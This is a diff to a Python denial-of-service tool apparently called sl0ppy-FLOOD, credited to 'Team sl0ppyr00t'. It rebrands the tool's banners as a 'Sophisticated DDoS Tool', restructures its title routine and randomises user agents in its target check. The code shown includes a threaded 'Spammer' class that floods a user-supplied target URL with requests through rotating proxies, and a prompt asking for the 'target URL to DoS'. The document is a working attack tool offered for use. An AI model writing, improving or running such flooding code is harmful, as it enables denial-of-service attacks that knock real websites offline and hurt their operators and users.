@@ -8227,6 +8227,7 @@ ua = ["Mozilla/5.0 (Android; Linux armv7l; rv:10.0.1) Gecko/20100101 Firefox/10.
 			]
 			
 
+
 class Spammer(threading.Thread):
     def __init__(self, url, number, lista):
         threading.Thread.__init__(self)
@@ -8259,14 +8260,14 @@ class Spammer(threading.Thread):
         urllib.request.urlopen(req)
 
         print(Fore.RED + "0000000000000000000000000000")
-        print(Fore.YELLOW + "DDoS, By Team sl0ppyr00t!!")
+        print(Fore.YELLOW + "DDoS Attack in Progress")
         print(Fore.RED + "0000000000000000000000000000")
         print(Style.RESET_ALL, end="")
 
         sys.stdout.write(Fore.WHITE + f"Thread #{self.num:4d} | {N:4d}/{len(self.lista)} | Proxy@{self.lista[N]}")
         sys.stdout.flush()
         sys.stdout.write("\r")
-	    
+
     def run(self):
         global N
         self.Lock.acquire()
@@ -8280,20 +8281,20 @@ class Spammer(threading.Thread):
             except:
                 pass
         sys.exit(0)
-	    
-def title():
-    sys.stdout.write("                                                                                          \n")
-    sys.stdout.write("             " + "+0000000000000000000000000000000000000000000000000000000+\n")
-    sys.stdout.write("             " + "0             sl0ppy-FLOOD 3.0              ""          0\n")
-    sys.stdout.write("             " + "0        ADDED NEW METHOD AND BYPASS    ""              0\n")
-    sys.stdout.write("             " + "0        ADDED NEW UA + Custom UA           ""          0\n")
-    sys.stdout.write("             " + "+0000000000000000000000000000000000000000000000000000000+\n")
-    sys.stdout.write("\n")
 
 class MainLoop():
     def __init__(self):
         if os.name in ("nt", "posix", "mac", "os2", "ce", "java", "riscos", "atheos", "amigaos", "beos", "uwin", "vms", "cygwin", "zos", "aix", "irix", "osf1", "hpux", "sunos", "freebsd", "openbsd", "netbsd", "darwin", "linux", "solaris", "haiku", "aros", "syllable", "skyos", "hurd", "minix", "android", "ios", "qnx", "blackberry", "webos", "windowsphone", "windowsce", "symbian", "microsoft", "dec", "sgi", "hp", "sun", "macintosh", "win32", "posix"):
-            title()
+            self.title()
+
+    def title(self):
+        sys.stdout.write("                                                                                          \n")
+        sys.stdout.write("             " + "+0000000000000000000000000000000000000000000000000000000+\n")
+        sys.stdout.write("             " + "0             Sophisticated DDoS Tool        ""          0\n")
+        sys.stdout.write("             " + "0        By Team sl0ppyr00t                ""              0\n")
+        sys.stdout.write("             " + "0        Press Ctrl+C to stop the attack   ""          0\n")
+        sys.stdout.write("             " + "+0000000000000000000000000000000000000000000000000000000+\n")
+        sys.stdout.write("\n")
 
     def check_url(self, url):
         if url[:4] == "www.":
@@ -8305,25 +8306,20 @@ class MainLoop():
         return url
 
     def setup(self):
-        global Close, Request, Tot_req
+        global N, Close, Request, Tot_req
         while True:
             print(Fore.RED + "0000000000000000000000000000")
-            print(Fore.YELLOW + "     We Proudly Present   ")
-            print(Fore.YELLOW + "     sl0ppy-FLOOD 3.0     ")
-            print(Fore.YELLOW + "                          ")
-            print(Fore.YELLOW + "     Auth : p.hoogeveen   ")
-            print(Fore.YELLOW + "     AKA  : x0xr00t       ")
-            print(Fore.YELLOW + "     Team : Sl0ppyr00t    ")
+            print(Fore.YELLOW + "Sophisticated DDoS Tool")
             print(Fore.RED + "0000000000000000000000000000")
             print(Style.RESET_ALL)
-            url = input('> Enter URL to DoS: ')
+            url = input('> Enter the target URL to DoS: ')
             url = self.check_url(url)
             try:
-                req = urllib.request.Request(url, None, {'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/101.0.4951.41 Safari/537.36'})
+                req = urllib.request.Request(url, None, {'User-Agent': random.choice(ua)})
                 response = urllib.request.urlopen(req)
                 break
             except:
-                print('> Could not open specified URL.')
+                print('> Could not open the specified URL.')
 
         while True:
             try:
